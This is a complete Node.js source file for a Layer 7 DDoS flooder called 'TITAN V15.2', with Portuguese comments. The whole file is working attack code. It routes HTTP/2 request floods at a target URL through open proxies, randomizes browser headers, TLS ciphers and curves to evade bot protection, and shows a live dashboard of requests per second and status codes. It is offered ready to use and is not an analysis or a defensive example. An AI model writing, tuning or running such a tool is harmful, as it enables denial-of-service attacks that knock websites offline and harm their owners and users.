#!/usr/bin/env node

/**
 * TITAN V15.2 - Layer 7 Attack Tool (Fix + Optimized)
 * Usage: node titan.js <url> <time> <rate> <threads> [proxyfile]
 * Example: node titan.js https://example.com 60 500 4 proxy.txt
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
// ==========================================
// ⚠️ Agora mostramos erros para debug, mas sem interromper o fluxo
process.on('uncaughtException', (err) => { /* console.error(err) */ });
process.on('unhandledRejection', (err) => { /* console.error(err) */ });

const args = { 
    target: process.argv[2], 
    time: ~~process.argv[3], 
    rate: ~~process.argv[4], 
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt"
};

if (!args.target || !args.time || !args.rate || !args.threads) {
    console.log(`
┌─────────────────────────────────────────────────────────┐
│ TITAN V15.2 - Layer 7 Attack Tool                      │
├─────────────────────────────────────────────────────────┤
│ Usage: node titan.js <url> <time> <rate> <threads> [proxyfile] │
│ Example: node titan.js https://example.com 60 500 4 proxy.txt │
└─────────────────────────────────────────────────────────┘
`);
    process.exit(1);
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(l => l.trim() && l.includes(':'));
if (!proxies.length) {
    console.error("❌ Nenhuma proxy válida encontrada. Verifique o arquivo proxy.txt");
    process.exit(1);
}

// ===== BLOCO IMPORTADO DO bypass.js (geração de headers dinâmicos) =====
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

function randstr(length) {
    return Array.from({ length }, () => "0123456789"[Math.floor(Math.random() * 10)]).join('');
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];
const getRandomBrowser = () => browsers[Math.floor(Math.random() * browsers.length)];

const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 },
        duckduckgo: { min: 12, max: 16 }
    };

    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux",
        duckduckgo: "macOS"
    };
    const platform = platforms[browser];

    // Header base
    let headers = {
        ":method": "GET",
        ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3, 8),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": "https://www.google.com/",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "cache-control": "max-age=0"
    };

    // Personaliza de acordo com o browser
    if (browser === "chrome" || browser === "brave" || browser === "opera" || browser === "operagx") {
        const ver = Math.floor(versions[browser].min + Math.random() * (versions[browser].max - versions[browser].min + 1));
        headers["sec-ch-ua"] = `"Not-A.Brand";v="99", "Chromium";v="${ver}", "Google Chrome";v="${ver}"`;
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = `"${platform}"`;
        headers["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver}.0.0.0 Safari/537.36`;
        headers["upgrade-insecure-requests"] = "1";
    } else if (browser === "firefox") {
        const ver = Math.floor(versions[browser].min + Math.random() * (versions[browser].max - versions[browser].min + 1));
        headers["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${ver}.0) Gecko/20100101 Firefox/${ver}.0`;
        headers["dnt"] = "1";
    } else if (browser === "safari") {
        const ver = Math.floor(versions[browser].min + Math.random() * (versions[browser].max - versions[browser].min + 1));
        headers["user-agent"] = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver}.0 Safari/605.1.15`;
    } else if (browser === "mobile") {
        const ver = Math.floor(versions[browser].min + Math.random() * (versions[browser].max - versions[browser].min + 1));
        headers["user-agent"] = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver}.0.0.0 Mobile Safari/537.36`;
        headers["sec-ch-ua-mobile"] = "?1";
    } else if (browser === "duckduckgo") {
        headers["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 DuckDuckGo/12.0`;
    }

    // Adiciona randomização extra
    const randomString = randstr(6);
    if (Math.random() < 0.3) headers["x-forwarded-for"] = `${randomString}:${randomString}`;
    if (Math.random() < 0.3) headers["referer"] = `https://${randomString}.com`;

    return headers;
};

function shuffleHeaders(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffled = {};
    keys.forEach(key => shuffled[key] = obj[key]);
    return shuffled;
}

// ===== MELHORIAS: lista de ciphers e curvas ECDH =====
const CIPHER_SUITES = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

const ECDH_CURVES = ["x25519", "secp256r1", "secp384r1", "secp521r1"];
const ALPN_PROTOCOLS = ["h2", "http/1.1", "h3"];

function format(n) {
    if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n;
}

// ==========================================
// MASTER
// ==========================================
if (cluster.isMaster) {
    console.clear();
    let totalSent = 0, rps = 0;
    const codes = {}, proxyHits = {}, onlineProxies = new Set();

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log(`\n\x1b[1;37m  \x1b[42m NFU \x1b[0m \x1b[1;32mTITAN V15.2 \x1b[1;30m| \x1b[1;37m[MAX POTENCY + FIXED]\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        process.stdout.write(`\x1b[1;37m  SENT: \x1b[1;32m${format(totalSent).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  RPS: \x1b[1;32m${format(rps).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  TARGET: \x1b[1;36m${parsedTarget.host}\x1b[0m\n`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).slice(0, 4).map(([c,v]) => {
            let color = c == "403" ? "\x1b[1;31m" : (c == "200" ? "\x1b[1;32m" : "\x1b[1;33m");
            return `${color}${c}\x1b[1;37m:${format(v)}`;
        }).join(' \x1b[1;30m| ');
        
        console.log(`\x1b[1;37m  STATUS: ${st || '\x1b[1;30mMoendo...'}\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES ONLINE: \x1b[1;32m${onlineProxies.size}\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 3).forEach(([ip, count]) => {
            console.log(`  \x1b[1;30m> \x1b[1;32m${ip.padEnd(15)}\x1b[1;30m ─ \x1b[1;37mHITS: \x1b[1;32m${format(count)}\x1b[0m`);
        });
        
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; rps += msg.c;
            if (msg.ip) {
                onlineProxies.add(msg.ip);
                proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            }
            Object.keys(msg.codes).forEach(c => { codes[c] = (codes[c] || 0) + msg.codes[c]; });
        }
    });
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    // ==========================================
    // WORKER – ATAQUE CORRIGIDO
    // ==========================================
    for (let i = 0; i < 10; i++) setImmediate(runFlooder); // 10 flooders por worker

    function runFlooder() {
        const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyRaw) {
            setTimeout(runFlooder, 500);
            return;
        }

        const parts = proxyRaw.split(':');
        const pHost = parts[0];
        const pPort = parseInt(parts[1]);

        // Tenta conectar até 3 vezes
        let attempts = 0;
        const attemptConnect = () => {
            attempts++;
            if (attempts > 3) {
                setTimeout(runFlooder, 1000);
                return;
            }

            const socket = net.connect({ host: pHost, port: pPort });
            socket.setNoDelay(true);
            socket.setKeepAlive(true, 60000);
            socket.setTimeout(10000);

            socket.once("connect", () => {
                socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
            });

            socket.once("data", (d) => {
                if (!d.toString().includes("200")) {
                    socket.destroy();
                    setTimeout(attemptConnect, 1000);
                    return;
                }
                
                const cipher = CIPHER_SUITES[Math.floor(Math.random() * CIPHER_SUITES.length)];
                const curve = ECDH_CURVES[Math.floor(Math.random() * ECDH_CURVES.length)];

                const tlsConn = tls.connect({
                    socket: socket,
                    servername: parsedTarget.host,
                    ALPNProtocols: ALPN_PROTOCOLS,
                    rejectUnauthorized: false,
                    ciphers: cipher,
                    ecdhCurve: curve
                }, () => {
                    const client = http2.connect(parsedTarget.href, {
                        createConnection: () => tlsConn,
                        settings: { 
                            initialWindowSize: 2147483647,
                            maxConcurrentStreams: 10000,
                            enablePush: false,
                            headerTableSize: 65536,
                            maxHeaderListSize: 262144
                        }
                    });

                    client.on("connect", () => {
                        let bCount = 0; let bCodes = {};
                        let isActive = true;
                        let lastSend = Date.now();

                        // Loop controlado por intervalo (garante que as requisições sejam enviadas)
                        const floodInterval = setInterval(() => {
                            if (!isActive || client.destroyed) {
                                clearInterval(floodInterval);
                                return;
                            }
                            // Envia a quantidade definida por segundo (rate)
                            for (let i = 0; i < args.rate; i++) {
                                const browser = getRandomBrowser();
                                let headers = generateHeaders(browser);
                                const finalHeaders = shuffleHeaders(headers);

                                const req = client.request(finalHeaders);
                                req.on("response", (res) => {
                                    const sc = res[":status"];
                                    bCount++; bCodes[sc] = (bCodes[sc] || 0) + 1;
                                    if (bCount >= 50) {
                                        process.send({ type: 'batch', c: bCount, codes: bCodes, ip: pHost });
                                        bCount = 0; bCodes = {};
                                    }
                                    req.close(); req.destroy();
                                });
                                req.on("error", () => { req.close(); req.destroy(); });
                                req.end();
                            }
                        }, 1000);

                        // Mantém a sessão ativa por 20s, depois renova
                        setTimeout(() => {
                            isActive = false;
                            clearInterval(floodInterval);
                            client.destroy();
                            socket.destroy();
                            setTimeout(runFlooder, 100);
                        }, 20000);
                    });

                    client.on("error", () => {
                        client.destroy();
                        socket.destroy();
                        setTimeout(runFlooder, 1000);
                    });
                });
                tlsConn.on("error", () => {
                    socket.destroy();
                    setTimeout(attemptConnect, 1000);
                });
            });

            socket.on("error", () => {
                socket.destroy();
                setTimeout(attemptConnect, 1000);
            });

            socket.on("timeout", () => {
                socket.destroy();
                setTimeout(attemptConnect, 1000);
            });
        };

        attemptConnect();
    }
}
